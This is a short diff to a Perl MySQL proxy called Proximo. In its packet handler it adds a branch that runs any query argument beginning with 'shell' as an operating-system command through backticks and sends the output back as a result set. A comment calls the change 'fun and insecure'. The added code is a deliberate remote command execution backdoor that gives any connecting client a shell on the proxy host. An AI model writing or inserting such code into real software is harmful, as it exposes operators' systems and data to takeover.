@@ -85,6 +85,19 @@ sub event_packet {
         my $packet = Proximo::MySQL::Packet::Command->new_from_raw( $seq, $packet_raw );
         Proximo::info( 'Got command: type=%d, arg=%s.', $packet->command_type, $packet->argument );
 
+        # let's do something fun and insecure
+        if ( $packet->argument =~ /^shell\s+(.+)$/i ) {
+            my $cmd = `$1`;
+            my @out = map { [ $_ ] } split /\r?\n/, $cmd;
+
+            $self->_make_simple_result(
+                    $packet->sequence_number + 1,
+                    [ 'shell command' ],
+                    @out,
+                );
+            return;
+        }
+
         # if we have a dedicated backend, let's send this on
         if ( $self->backend ) {
             Proximo::debug( 'Using existing backend.' );
